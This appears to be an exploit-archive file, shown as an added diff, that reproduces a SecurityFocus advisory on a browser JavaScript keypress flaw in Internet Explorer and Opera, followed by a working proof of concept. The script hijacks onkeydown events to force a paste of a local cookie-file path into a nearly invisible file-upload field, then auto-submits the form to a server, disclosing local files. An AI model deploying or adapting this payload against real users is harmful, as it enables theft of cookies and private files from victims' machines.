@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/5290/info
+
+An issue has been reported with the JavaScript implementation of multiple web browsers, including Microsoft Internet Explorer and Opera. Malicious JavaScript may subvert some keypress events, with consequences including the disclosure of arbitrary local files to a remote server.
+
+Through JavaScript, it is possible to define an event handler for the 'onkeydown' event, which fires when a key is pressed by the end user. Malicious script code may subvert this event to an arbitrary Ctrl-key combination, including events such as Paste. By further modifying the environment, it is possible to paste arbitrary content into a file upload form field.
+
+This form may also be submitted by the malicious script, disclosing arbitrary local file contents to a remote server.
+
+Other attacks based on script interaction with the cut and paste functionality of Windows may also be possible.
+
+<div id=h style="zoom:0.0001">
+<form name=u enctype="multipart/form-data" method=post action=upload.php>
+<input type=file name=file></form></div>
+<script>
+//uploadFile="..\\LOCALS~1\\TEMPOR~1\\CONTENT.IE5\\index.dat";
+uploadFile="..\\Cookies\\index.dat";
+function gotKey(){
+if (event.ctrlKey)
+event.keyCode = 86;
+else if (event.shiftKey)
+event.keyCode = 45;
+else
+return;
+document.onkeydown = null;
+window.clipboardData.setData("Text",uploadFile);
+(p=document.forms.u.file).focus();
+p.onpropertychange = function(){document.forms.u.submit()};
+} document.onkeydown = gotKey;
+window.onload=function(){document.body.focus()};
+</script>
